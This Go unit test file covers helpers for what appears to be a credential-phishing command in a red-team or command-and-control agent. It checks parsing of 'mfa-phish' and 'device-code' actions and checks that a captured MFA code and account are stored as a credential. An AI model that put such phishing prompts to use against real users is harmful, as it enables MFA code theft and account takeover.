package commands

import (
	"strings"
	"testing"
)

// --- credPromptExtractAction tests ---

func TestCredPromptExtractAction_ValidJSON(t *testing.T) {
	params := `{"action": "mfa-phish", "other": "ignored"}`
	got := credPromptExtractAction(params)
	if got != "mfa-phish" {
		t.Errorf("extractAction = %q, want mfa-phish", got)
	}
}

func TestCredPromptExtractAction_LowercasesAction(t *testing.T) {
	params := `{"action": "MFA-PHISH"}`
	got := credPromptExtractAction(params)
	if got != "mfa-phish" {
		t.Errorf("extractAction uppercase = %q, want mfa-phish (lowercased)", got)
	}
}

func TestCredPromptExtractAction_EmptyParams(t *testing.T) {
	got := credPromptExtractAction("")
	if got != "" {
		t.Errorf("empty params = %q, want empty", got)
	}
}

func TestCredPromptExtractAction_InvalidJSON(t *testing.T) {
	got := credPromptExtractAction("not json")
	if got != "" {
		t.Errorf("invalid JSON = %q, want empty", got)
	}
}

func TestCredPromptExtractAction_MissingActionField(t *testing.T) {
	got := credPromptExtractAction(`{"other": "value"}`)
	if got != "" {
		t.Errorf("missing action field = %q, want empty", got)
	}
}

func TestCredPromptExtractAction_DeviceCode(t *testing.T) {
	params := `{"action": "device-code", "tenant_id": "mytenant"}`
	got := credPromptExtractAction(params)
	if got != "device-code" {
		t.Errorf("device-code action = %q, want device-code", got)
	}
}

// --- credPromptMFAPhishResult tests ---

func TestCredPromptMFAPhishResult_WithCode(t *testing.T) {
	result := credPromptMFAPhishResult("123456", "Corporate Login", "alice@corp.com", "Linux")
	if result.Status != "success" {
		t.Errorf("status = %q, want success", result.Status)
	}
	if !result.Completed {
		t.Error("completed should be true")
	}
	if !strings.Contains(result.Output, "123456") {
		t.Errorf("output %q should contain the MFA code", result.Output)
	}
	if !strings.Contains(result.Output, "alice@corp.com") {
		t.Errorf("output %q should contain the username", result.Output)
	}
	if !strings.Contains(result.Output, "Corporate Login") {
		t.Errorf("output %q should contain the dialog title", result.Output)
	}
	if !strings.Contains(result.Output, "Linux") {
		t.Errorf("output %q should contain the platform", result.Output)
	}
}

func TestCredPromptMFAPhishResult_SetsCredential(t *testing.T) {
	result := credPromptMFAPhishResult("654321", "Login", "bob@corp.com", "Darwin")
	if result.Credentials == nil {
		t.Fatal("credentials should be set when code is non-empty")
	}
	creds := *result.Credentials
	if len(creds) != 1 {
		t.Fatalf("credential count = %d, want 1", len(creds))
	}
	if creds[0].Credential != "654321" {
		t.Errorf("credential value = %q, want 654321", creds[0].Credential)
	}
	if creds[0].Account != "bob@corp.com" {
		t.Errorf("credential account = %q, want bob@corp.com", creds[0].Account)
	}
}

func TestCredPromptMFAPhishResult_EmptyCode(t *testing.T) {
	result := credPromptMFAPhishResult("", "Login", "user@corp.com", "Linux")
	if result.Status != "success" {
		t.Errorf("empty code status = %q, want success", result.Status)
	}
	if strings.Contains(result.Output, "[SENSITIVE]") {
		t.Error("empty code result should not contain SENSITIVE")
	}
}
